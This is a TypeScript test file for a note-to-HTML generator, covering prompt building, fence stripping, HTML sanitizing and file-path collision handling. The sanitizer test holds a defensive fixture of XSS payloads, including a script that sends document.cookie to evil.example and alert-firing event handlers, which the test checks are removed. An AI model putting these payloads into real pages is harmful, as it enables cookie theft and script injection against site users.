import { describe, expect, test } from "bun:test";
import { JSDOM } from "jsdom";
import {
	buildHtmlPagePrompt,
	nextAvailablePath,
	sanitizeHtmlDocument,
	stripReplyFences,
} from "../src/generate/html";

const domWindow = new JSDOM("").window as unknown as Window & typeof globalThis;

describe("buildHtmlPagePrompt", () => {
	test("includes the note title and content in the user message", () => {
		const messages = buildHtmlPagePrompt("My Note", "Some note body.");

		expect(messages).toHaveLength(2);
		expect(messages[0]?.role).toBe("system");
		expect(messages[1]?.role).toBe("user");
		expect(messages[1]?.content).toContain("My Note");
		expect(messages[1]?.content).toContain("Some note body.");
	});

	test("system message asks for a self-contained document with no fences", () => {
		const messages = buildHtmlPagePrompt("Title", "Body");
		const system = String(messages[0]?.content ?? "");

		expect(system).toContain("self-contained");
		expect(system.toLowerCase()).toContain("inline");
		expect(system).toContain("Output ONLY the HTML");
	});
});

describe("stripReplyFences", () => {
	test("strips a ```html fenced reply", () => {
		const reply = "```html\n<!DOCTYPE html><html><body>Hi</body></html>\n```";
		expect(stripReplyFences(reply)).toBe(
			"<!DOCTYPE html><html><body>Hi</body></html>",
		);
	});

	test("strips a bare ``` fenced reply with no language tag", () => {
		const reply = "```\n<html><body>Bare</body></html>\n```";
		expect(stripReplyFences(reply)).toBe("<html><body>Bare</body></html>");
	});

	test("passes through an unfenced reply untouched (aside from trimming)", () => {
		const reply = "  <html><body>No fence</body></html>  \n";
		expect(stripReplyFences(reply)).toBe("<html><body>No fence</body></html>");
	});

	test("leaves fences alone that don't wrap the entire reply (mixed content)", () => {
		const reply =
			"<html><body>Some text with an inline ```code``` block.</body></html>";
		expect(stripReplyFences(reply)).toBe(reply);
	});

	test("handles a multi-line fenced document with internal blank lines", () => {
		const reply = [
			"```html",
			"<!DOCTYPE html>",
			"<html>",
			"<head><style>body{margin:0}</style></head>",
			"",
			"<body>",
			"<h1>Hi</h1>",
			"</body>",
			"</html>",
			"```",
		].join("\n");

		const result = stripReplyFences(reply);
		expect(result.startsWith("<!DOCTYPE html>")).toBe(true);
		expect(result.endsWith("</html>")).toBe(true);
		expect(result).not.toContain("```");
	});
});

describe("sanitizeHtmlDocument", () => {
	test("strips <script>, event handlers, iframe, form, link, and meta-refresh", () => {
		const dirty = [
			"<!DOCTYPE html>",
			"<html>",
			"<head>",
			"<title>Note</title>",
			'<link rel="stylesheet" href="https://evil.example/x.css">',
			'<meta http-equiv="refresh" content="0;url=https://evil.example">',
			"<style>body{color:#222}</style>",
			"<script>fetch('https://evil.example/?data='+document.cookie)</script>",
			"</head>",
			'<body onload="alert(1)">',
			"<h1>Hi</h1>",
			'<p onclick="alert(1)">Click me</p>',
			'<img src="https://evil.example/x.png" onerror="alert(1)">',
			'<iframe src="https://evil.example"></iframe>',
			'<form action="https://evil.example"><input></form>',
			"</body>",
			"</html>",
		].join("");

		const clean = sanitizeHtmlDocument(dirty, domWindow);

		expect(clean).not.toContain("<script");
		expect(clean).not.toContain("onload");
		expect(clean).not.toContain("onclick");
		expect(clean).not.toContain("onerror");
		expect(clean).not.toContain("<iframe");
		expect(clean).not.toContain("<form");
		expect(clean).not.toContain("<link");
		expect(clean).not.toContain('http-equiv="refresh"');
		expect(clean.toLowerCase()).not.toContain("refresh");
	});

	test("keeps benign markup (headings, paragraphs, inline style)", () => {
		const html =
			"<!DOCTYPE html><html><head><title>Note</title><style>body{margin:0}</style></head><body><h1>Title</h1><p>Some <strong>content</strong>.</p></body></html>";

		const clean = sanitizeHtmlDocument(html, domWindow);

		expect(clean).toContain("<h1>Title</h1>");
		expect(clean).toContain("<strong>content</strong>");
		expect(clean).toContain("<style>body{margin:0}</style>");
	});

	test("injects a restrictive CSP meta tag into <head>", () => {
		const html =
			"<!DOCTYPE html><html><head><title>Note</title></head><body><p>Hi</p></body></html>";

		const clean = sanitizeHtmlDocument(html, domWindow);

		expect(clean).toContain('<meta http-equiv="Content-Security-Policy"');
		expect(clean).toContain("default-src 'none'");
		expect(clean).toContain("img-src data:");
	});

	test("prepends a fresh <!DOCTYPE html>", () => {
		const html = "<html><head></head><body><p>Hi</p></body></html>";
		const clean = sanitizeHtmlDocument(html, domWindow);
		expect(clean.startsWith("<!DOCTYPE html>")).toBe(true);
	});

	test("throws when no window is available and none is provided", () => {
		expect(() => sanitizeHtmlDocument("<p>hi</p>", undefined)).toThrow();
	});
});

describe("nextAvailablePath", () => {
	test("returns the desired path untouched when it doesn't exist", () => {
		const result = nextAvailablePath("Notes/My Note.html", () => false);
		expect(result).toBe("Notes/My Note.html");
	});

	test("suffixes ' (2)' when the desired path already exists", () => {
		const existing = new Set(["Notes/My Note.html"]);
		const result = nextAvailablePath("Notes/My Note.html", (p) =>
			existing.has(p),
		);
		expect(result).toBe("Notes/My Note (2).html");
	});

	test("keeps incrementing past multiple collisions", () => {
		const existing = new Set([
			"Notes/My Note.html",
			"Notes/My Note (2).html",
			"Notes/My Note (3).html",
		]);
		const result = nextAvailablePath("Notes/My Note.html", (p) =>
			existing.has(p),
		);
		expect(result).toBe("Notes/My Note (4).html");
	});

	test("works with no directory prefix", () => {
		const existing = new Set(["My Note.png"]);
		const result = nextAvailablePath("My Note.png", (p) => existing.has(p));
		expect(result).toBe("My Note (2).png");
	});
});
